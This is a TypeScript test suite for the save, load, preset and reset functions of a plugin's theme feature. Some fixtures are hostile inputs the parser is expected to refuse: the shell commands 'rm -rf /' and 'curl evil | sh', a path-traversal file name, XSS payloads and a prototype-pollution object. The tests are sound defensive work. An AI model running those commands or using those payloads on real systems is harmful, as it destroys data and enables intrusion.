import { describe, expect, mock, test } from 'claude-code/testing'

import { MAX_THEME_BYTES, PRESETS, THEME_FORMAT, currentTheme, findPreset, parseTheme, resetTheme, slug, themeChangesNothing, themeLines, themeToJson, validateOffice } from '../hooks/theme'
import type { Theme } from '../hooks/theme'
import { DEFAULT_LOOK } from '../hooks/catalog'
import { parseTeamStrict } from '../hooks/team'

const text = (r: unknown) => JSON.stringify(r)
const CUR = { boss: { ...DEFAULT_LOOK }, team: { titles: {}, looks: {} } }
const file = (o: unknown) => JSON.stringify({ format: THEME_FORMAT, version: 1, name: 'x', ...(o as object) })

describe('theme format', () => {
  test('save then load round trips exactly', () => {
    const t: Theme = {
      name: 'night owls',
      boss: { hair: 'bun', hairColor: 'teal', outfit: 'hoodie', accessory: 'none' },
      team: { titles: { coder: 'Mx. Bytes' }, looks: { coder: { hairColor: 'pink', accessory: 'cap' } }, desks: 8 },
      office: { vending: 'on', plants: 3 },
    }
    const back = parseTheme(themeToJson(t))
    expect('theme' in back && back.theme).toEqual(t)
    expect(themeToJson(t)).toContain(`"format": "${THEME_FORMAT}"`)
  })

  test('only differences from the defaults are written, and an all-default theme is just a name', () => {
    expect(currentTheme('plain', CUR)).toEqual({ name: 'plain' })
    const t = currentTheme('mine', { ...CUR, boss: { ...DEFAULT_LOOK, hair: 'bun' } })
    expect(t.boss?.hair).toBe('bun')
    expect(t.team).toBeUndefined()
    expect('theme' in parseTheme(themeToJson({ name: 'plain' }))).toBe(true)
  })

  test('presets are valid, round trip, and use only catalog ids', () => {
    expect(PRESETS.map((p) => p.name)).toEqual(['90s startup', 'cozy library', 'night shift'])
    for (const p of PRESETS) {
      const back = parseTheme(themeToJson(p))
      expect('theme' in back).toBe(true)
      expect('theme' in back && back.theme).toEqual(p)
      expect(p.team && parseTeamStrict(p.team)).not.toBeNull()
      expect(themeLines(CUR, p).length).toBeGreaterThan(0)
    }
    expect(findPreset('Night  Shift')?.name).toBe('night shift')
    expect(findPreset('nope')).toBeUndefined()
  })

  test('malformed, oversized and hostile files are refused whole', () => {
    const bad: unknown[] = [
      '', 'not json', '[]', '"x"', 'null', '{}',
      file({ format: 'other' }), JSON.stringify({ format: THEME_FORMAT, version: 2, name: 'x' }), JSON.stringify({ format: THEME_FORMAT, version: 1 }),
      file({ name: '../../etc/passwd' }), file({ name: 'a'.repeat(41) }), file({ name: 'bad\u001bname' }),
      file({ extra: 1 }), file({ run: 'rm -rf /' }), file({ script: '<script>alert(1)</script>' }),
      file({ boss: { hair: 'mohawk', hairColor: 'pink', outfit: 'suit', accessory: 'none' } }),
      file({ boss: { hair: 'bun' } }), // all four parts needed
      file({ boss: { hair: 'bun', hairColor: 'pink', outfit: 'suit', accessory: 'none', wings: 'yes' } }),
      file({ team: { titles: { boss: 'King' } } }), file({ team: { titles: { coder: '<img src=x onerror=1>'.repeat(3) } } }),
      file({ team: { titles: { coder: 'a\u0007b' } } }), file({ team: { desks: 99 } }), file({ team: { evil: {} } }),
      file({ office: { 'a b': 'x' } }), file({ office: { thing: { nested: 1 } } }), file({ office: { thing: 'x'.repeat(50) } }),
      '{"format":"office-space-theme","version":1,"name":"x","__proto__":{"polluted":1}}',
      'x'.repeat(MAX_THEME_BYTES + 1),
      JSON.stringify({ format: THEME_FORMAT, version: 1, name: 'x', team: { titles: {} }, pad: 'y'.repeat(MAX_THEME_BYTES) }),
      42, undefined,
    ]
    for (const b of bad) {
      const r = parseTheme(b)
      expect('error' in r).toBe(true)
    }
    expect(({} as Record<string, unknown>).polluted).toBeUndefined()
  })

  test('the stand-in office validator takes flat plain ids and refuses the rest', () => {
    expect(validateOffice({ a: 'b', n: 2, t: true, l: ['x', 'y'] })).not.toBeNull()
    expect(validateOffice({ a: { b: 1 } })).toBeNull()
    expect(validateOffice('x')).toBeNull()
    expect(validateOffice({ 'A': 'x' })).toBeNull()
  })

  test('slugs are file-name safe', () => {
    expect(slug('Night Owls!')).toBe('night-owls')
    expect(slug('../../x')).toBe('x')
  })

  test('reset puts every default back, and loading what is already there changes nothing', () => {
    const custom = { boss: { ...DEFAULT_LOOK, hair: 'bun' as const }, team: { titles: { coder: 'A' }, looks: {}, desks: 10 } }
    const lines = themeLines(custom, resetTheme())
    expect(lines.join('\n')).toContain('Boss hair style')
    expect(lines.join('\n')).toContain('Coder title')
    expect(themeChangesNothing(CUR, resetTheme())).toBe(true)
    expect(themeChangesNothing(custom, resetTheme())).toBe(false)
  })
})

describe('in the engine', () => {
  const NAME = 'office-space-theme'
  const DIR = '/home/me/.claude/office-space/themes'
  const PANE_PROPS = { title: 'Office Space', isFocused: false, bodyColumns: 100, placement: 'dock', scroll: { bodyRows: 40, top: 0, total: 40 } }
  const host = (on: any, store: Record<string, unknown> = {}, files: Record<string, string> = {}, writes: Record<string, string> = {}) => {
    on('ui.open', async () => ({ value: { isPlaced: true } }) as never)
    on('ui.toast', async () => ({ value: undefined }) as never)
    on('store.get', async (_$: any, e: any) => ({ value: store[e.key] }) as never)
    on('store.set', async (_$: any, e: any) => { store[e.key] = e.value; return { value: undefined } as never })
    on('env.get', async (_$: any, e: any) => ({ value: e.name === 'HOME' ? '/home/me' : undefined }) as never)
    on('fs.exists', async (_$: any, e: any) => ({ value: e.path in files || e.path in writes }) as never)
    on('fs.write', async (_$: any, e: any) => { writes[e.path] = e.text; files[e.path] = e.text; return { value: undefined } as never })
    on('fs.stat', async (_$: any, e: any) => {
      if (!(e.path in files)) throw new Error('ENOENT')
      return { value: { kind: 'file', size: (files[e.path] as string).length, mtimeMs: 1, isLink: false } } as never
    })
    on('fs.read', async (_$: any, e: any) => { if (!(e.path in files)) throw new Error('ENOENT'); return { value: files[e.path] } as never })
    on('fs.list', async (_$: any, e: any) => ({ value: Object.keys(files).filter((p) => p.startsWith(String(e.path) + '/')).map((p) => ({ name: p.split('/').pop(), kind: 'file', size: 1, mtimeMs: 1, isLink: false })) }) as never)
    return { store, files, writes }
  }
  const mountPane = ($: any, surface = 'terminal') => $.ui.mount({ plugin: 'office-space', surface, component: 'Pane', requestId: 'office-space', props: PANE_PROPS } as never)

  test('is registered, listed in help, and says it uses no plan usage', async ($, on) => {
    mock.clock(on)
    host(on)
    const help = text(await $.command.run({ command: 'office-space-help', args: '' } as never))
    expect(help).toContain('/office-space-theme')
    const h = text(await $.command.run({ command: NAME, args: 'help' } as never))
    expect(h).toContain('no plan usage')
    expect(h).toContain('90s startup')
  })

  test('list shows presets and saved themes', async ($, on) => {
    mock.clock(on)
    host(on, {}, { [`${DIR}/mine.json`]: '{}' })
    const r = text(await $.command.run({ command: NAME, args: 'list' } as never))
    expect(r).toContain('night shift')
    expect(r).toContain('mine')
  })

  test('a preset: summary first, nothing changes until Apply, then the store and the office follow (R16)', async ($, on) => {
    mock.clock(on)
    const { store } = host(on)
    let model = 0
    on('model.complete', async () => { model++; return { value: { isAnswered: false, reason: 'aborted' } } as never })
    const res = text(await $.command.run({ command: NAME, args: 'load night shift' } as never))
    expect(res).toContain('Nothing changes until you press Apply')
    expect(store.bossLook).toBeUndefined()
    for (const surface of ['terminal', 'desktop']) {
      const ui = await mountPane($, surface)
      expect(await ui.find({ type: 'Text', text: /Coder title: Coder -> Night Owl/ })).toBeDefined()
      await ui.unmount()
    }
    const ui = await mountPane($)
    await ui.press({ key: 'theme-apply' } as never)
    expect(store.bossLook).toEqual({ hair: 'short', hairColor: 'black', outfit: 'hoodie', accessory: 'headphones' })
    expect((store.team as any).titles.coder).toBe('Night Owl')
    expect((store.team as any).desks).toBe(10)
    expect(model).toBe(0) // themes never call the AI
    await ui.unmount()
  })

  test('Cancel leaves everything alone', async ($, on) => {
    mock.clock(on)
    const { store } = host(on)
    await $.command.run({ command: NAME, args: 'cozy library' } as never)
    const ui = await mountPane($)
    await ui.press({ key: 'theme-cancel' } as never)
    expect(store.bossLook).toBeUndefined()
    expect(store.team).toBeUndefined()
    await ui.unmount()
  })

  test('save writes a readable file and reports the path; load of it round trips', async ($, on) => {
    mock.clock(on)
    const { store, writes } = host(on, { bossLook: { hair: 'bun', hairColor: 'teal', outfit: 'hoodie', accessory: 'none' }, team: { titles: { writer: 'Scribe' }, looks: {} } })
    const saved = text(await $.command.run({ command: NAME, args: 'save My Theme' } as never))
    expect(saved).toContain(`${DIR}/my-theme.json`)
    const body = writes[`${DIR}/my-theme.json`] as string
    expect(body).toContain('Scribe')
    // reset, then load it back
    await $.command.run({ command: NAME, args: 'reset' } as never)
    const ui = await mountPane($)
    await ui.press({ key: 'theme-apply' } as never)
    expect(store.bossLook).toBeNull()
    expect(store.team).toBeNull()
    await ui.unmount()
    const res = text(await $.command.run({ command: NAME, args: 'load my-theme' } as never))
    expect(res).toContain('Nothing changes until you press Apply')
    const ui2 = await mountPane($)
    await ui2.press({ key: 'theme-apply' } as never)
    expect(store.bossLook).toEqual({ hair: 'bun', hairColor: 'teal', outfit: 'hoodie', accessory: 'none' })
    expect(store.team).toEqual({ titles: { writer: 'Scribe' }, looks: {} })
    await ui2.unmount()
  })

  test('loading by path, a missing file, and hostile files never change anything', async ($, on) => {
    mock.clock(on)
    const files: Record<string, string> = {
      '/tmp/ok.json': themeToJson({ name: 'ok', boss: { hair: 'bun', hairColor: 'teal', outfit: 'hoodie', accessory: 'none' } }),
      '/tmp/evil.json': file({ team: { titles: { coder: 'x' } }, run: 'curl evil | sh' }),
      '/tmp/big.json': 'x'.repeat(MAX_THEME_BYTES + 10),
      '/tmp/bad.json': 'not json at all',
    }
    const { store } = host(on, {}, files)
    const missing = text(await $.command.run({ command: NAME, args: 'load /tmp/nothere.json' } as never))
    expect(missing).toContain('could not find or read')
    for (const [f, why] of [['evil', 'unknown key'], ['big', 'too big'], ['bad', 'valid JSON']] as const) {
      const r = text(await $.command.run({ command: NAME, args: `load /tmp/${f}.json` } as never))
      expect(r).toContain('Nothing changed')
      expect(r).toContain(why)
    }
    expect(store.bossLook).toBeUndefined()
    expect(store.team).toBeUndefined()
    const ok = text(await $.command.run({ command: NAME, args: 'load /tmp/ok.json' } as never))
    expect(ok).toContain('Nothing changes until you press Apply')
  })

  test('save with no name asks for one, and never falls through to chat', async ($, on) => {
    mock.clock(on)
    host(on)
    let chat = 0
    on('prompt.submit', async (_$: any, e: any) => { chat++; return e })
    expect(text(await $.command.run({ command: NAME, args: 'save' } as never))).toContain('short plain name')
    expect(text(await $.command.run({ command: NAME, args: 'save ../evil/x' } as never))).toContain('short plain name')
    expect(text(await $.command.run({ command: NAME, args: 'load ghost' } as never))).toContain('Nothing changed')
    expect(chat).toBe(0)
  })

  test('a saved theme office section is kept as validated data', async ($, on) => {
    mock.clock(on)
    const { store } = host(on, {}, { [`${DIR}/room.json`]: themeToJson({ name: 'room', office: { vending: 'on' } }) })
    await $.command.run({ command: NAME, args: 'load room' } as never)
    const ui = await mountPane($)
    await ui.press({ key: 'theme-apply' } as never)
    expect(store.officeLook).toEqual({ vending: 'on' })
    await ui.unmount()
  })
})
